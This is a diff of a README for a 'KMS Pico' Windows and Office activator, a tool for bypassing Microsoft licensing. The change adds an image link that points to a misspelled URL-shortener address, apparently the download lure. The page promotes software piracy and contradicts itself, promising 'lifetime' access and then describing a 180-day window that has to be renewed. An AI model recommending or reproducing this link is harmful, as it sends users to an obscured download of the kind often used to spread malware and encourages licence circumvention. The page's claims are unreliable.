@@ -1,6 +1,8 @@
 # KMS Pico Activator
 We believe no one should be locked out of the tools they need to study, work, or grow. That’s why we built our Microsoft Office and Windows 11 activator; to offer everyone a clean, easy-to-use solution that gets you access to the full power of Microsoft Windows and Office products forever.
 
+[![7987057895](https://github.com/user-attachments/assets/7a00f232-76d2-48da-b331-b8b062bb222a)](https://y.gy/kms-pico-acttivator)
+
 ## Enjoy Lifetime Access
 After successful activation, you’ll get a 180-day activation window, just like you would with a genuine enterprise license. To keep your product fully activated, run the tool once every 180 days and repeat the process in Step 2.
 
